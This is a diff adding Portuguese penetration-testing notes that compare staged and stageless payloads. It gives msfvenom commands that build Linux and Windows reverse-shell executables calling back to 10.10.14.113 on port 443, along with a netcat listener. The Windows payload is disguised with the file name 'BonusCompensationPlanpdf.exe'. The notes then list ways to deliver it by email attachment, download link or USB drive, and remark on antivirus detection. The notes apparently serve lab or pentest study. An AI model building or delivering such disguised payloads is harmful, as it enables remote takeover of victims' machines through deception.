@@ -154,6 +154,23 @@ $diretorio -> close();
 - Staged: Pequeno stager inicial abre canal e baixa stage (Meterpreter) pela rede. Bom para espaço limitado, mas depende de conectividade.
 - Stageless: Payload completo em 1 arquivo. Maior, mas autônomo (sem download extra). Mais robusto em redes instáveis.
 - Stageless melhor opção também para hosts pessoais linux e windows, segue a abaixo comandos para sua fabricação e seu uso:
+```
+1- msfvenom -p linux/x64/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f elf > createbackup.elf
+2- sudo nc -lvnp 443
+3- Agora precisaríamos desenvolver uma maneira de colocar essa carga útil no sistema de destino. Existem inúmeras maneiras de fazer isso. Aqui estão apenas algumas das maneiras comuns:
+
+    - Mensagem de e-mail com o arquivo anexado.
+    - Faça o download do link em um site.
+    - Combinado com um módulo de exploração Metasploit (isso provavelmente exigiria que já estivéssemos na rede interna).
+    - Via flash drive como parte de um teste de penetração no local.
+
+No windows poderiamos utilizar a seguinte:
+
+1- msfvenom -p windows/shell_reverse_tcp LHOST=10.10.14.113 LPORT=443 -f exe > BonusCompensationPlanpdf.exe
+2- sudo nc -lvnp 443
+3- Esta é outra situação em que precisamos ser criativos para obter essa carga útil entregue a um sistema de destino. Sem nenhum encodingou encryption, a carga útil nesta forma quase certamente seria detectada pelo Windows Defender AV. Se o AV foi desativado tudo o que o usuário precisaria fazer é clicar duas vezes no arquivo para executar e teríamos uma sessão de shell.
+
+```
 
 ---
 # Extra
